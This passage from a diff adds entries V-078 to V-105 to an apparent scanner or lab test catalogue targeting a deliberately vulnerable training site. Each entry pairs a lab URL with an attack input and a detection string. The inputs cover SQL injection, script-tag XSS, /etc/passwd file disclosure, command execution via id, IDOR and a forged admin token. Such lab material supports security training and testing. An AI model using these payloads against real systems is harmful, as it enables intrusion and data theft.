+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-078?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-079",
+    "name": "SQLi Impact \u2014 Data Leak Lab #79",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-079?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-080",
+    "name": "XSS Impact \u2014 Script Injection Lab #80",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-080?p=<script>alert('EXPLOIT-80')</script>",
+    "payload": "EXPLOIT-80",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-80"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-081",
+    "name": "LFI Impact \u2014 File Disclosure Lab #81",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-081?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-082",
+    "name": "IDOR Impact \u2014 Private Data Lab #82",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-082?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-083",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #83",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-083",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-084",
+    "name": "RCE Impact \u2014 Command Exec Lab #84",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-084?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-085",
+    "name": "SQLi Impact \u2014 Data Leak Lab #85",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-085?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-086",
+    "name": "XSS Impact \u2014 Script Injection Lab #86",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-086?p=<script>alert('EXPLOIT-86')</script>",
+    "payload": "EXPLOIT-86",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-86"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-087",
+    "name": "LFI Impact \u2014 File Disclosure Lab #87",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-087?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-088",
+    "name": "IDOR Impact \u2014 Private Data Lab #88",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-088?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-089",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #89",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-089",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-090",
+    "name": "RCE Impact \u2014 Command Exec Lab #90",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-090?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-091",
+    "name": "SQLi Impact \u2014 Data Leak Lab #91",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-091?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-092",
+    "name": "XSS Impact \u2014 Script Injection Lab #92",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-092?p=<script>alert('EXPLOIT-92')</script>",
+    "payload": "EXPLOIT-92",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-92"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-093",
+    "name": "LFI Impact \u2014 File Disclosure Lab #93",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-093?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-094",
+    "name": "IDOR Impact \u2014 Private Data Lab #94",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-094?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-095",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #95",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-095",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-096",
+    "name": "RCE Impact \u2014 Command Exec Lab #96",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-096?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-097",
+    "name": "SQLi Impact \u2014 Data Leak Lab #97",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-097?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-098",
+    "name": "XSS Impact \u2014 Script Injection Lab #98",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-098?p=<script>alert('EXPLOIT-98')</script>",
+    "payload": "EXPLOIT-98",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-98"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-099",
+    "name": "LFI Impact \u2014 File Disclosure Lab #99",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-099?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-100",
+    "name": "IDOR Impact \u2014 Private Data Lab #100",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-100?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-101",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #101",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-101",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-102",
+    "name": "RCE Impact \u2014 Command Exec Lab #102",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-102?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-103",
+    "name": "SQLi Impact \u2014 Data Leak Lab #103",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-103?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-104",
+    "name": "XSS Impact \u2014 Script Injection Lab #104",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-104?p=<script>alert('EXPLOIT-104')</script>",
+    "payload": "EXPLOIT-104",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-104"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-105",
+    "name": "LFI Impact \u2014 File Disclosure Lab #105",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-105?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  }
 ]
